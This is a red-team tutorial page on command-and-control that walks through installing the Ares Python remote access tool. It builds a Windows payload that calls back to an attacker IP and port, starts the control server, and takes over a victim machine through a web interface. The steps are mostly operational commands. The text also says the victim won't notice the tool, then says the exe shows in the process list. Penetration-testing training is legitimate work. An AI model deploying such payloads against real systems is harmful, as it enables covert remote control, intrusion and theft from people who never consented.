# Red Teaming Squad : Command & Control

Command and control (C2) systems are used to manage remote sessions from compromised hosts. From a command and control program interface, a security tester or attacker can send commands directly from the program or access a remote shell. During a penetration test, a security tester can deploy a remote access terminal (RAT) on a compromised host that dials back to a command and control server.


## C2 with Web Interface : Ares

Ares is a Python Remote Access Tool and is made of two main programs:
1. A command and control server, which is a Web interface to administer the agents
2. An agent program, which is run on the compromised host, and ensures communication with the CNC


### Installation

You can install "Ares" using following command:

```
git clone https://github.com/sweetsoftware/Ares
cd Ares
pip install -r requirements.txt
./wine_setup.sh
```

### Usage

First of all you have to change the server address to attacker's IP address.

<kbd>![](Command_&_Control/1.png)</kbd>

Now create payload(exe file because target system is windows) using ```./builder.py -p Windows --server http://192.168.43.250:8080 -o temp.exe``` command and transfer the payload to victim's machine.

<kbd>![](Command_&_Control/2.png)</kbd>

Now initiate the server database using ```./ares.py initdb``` and then start the server using ```./ares.py runserver -h 192.168.43.250 -p 8080 --threaded``` command.

<kbd>![](Command_&_Control/3.png)</kbd>

Access the web server through browser.

<kbd>![](Command_&_Control/4.png)</kbd>

Run the payload.

<kbd>![](Command_&_Control/5.png)</kbd>

Observe the session on server.

<kbd>![](Command_&_Control/6.png)</kbd>

Now attacker can interact with target machine through the web interface.

<kbd>![](Command_&_Control/7.png)</kbd>

One of the benefit of ares tool is that victim won't notice that any unwanted application is running on his/her machine. If victim checks the running processes then he/she will find the exe file running on the machine. 

<kbd>![](Command_&_Control/8.png)</kbd>

For more use cases, you can use ```./builder.py --help``` command or you can visit this [URL](https://github.com/trustedsec/unicorn).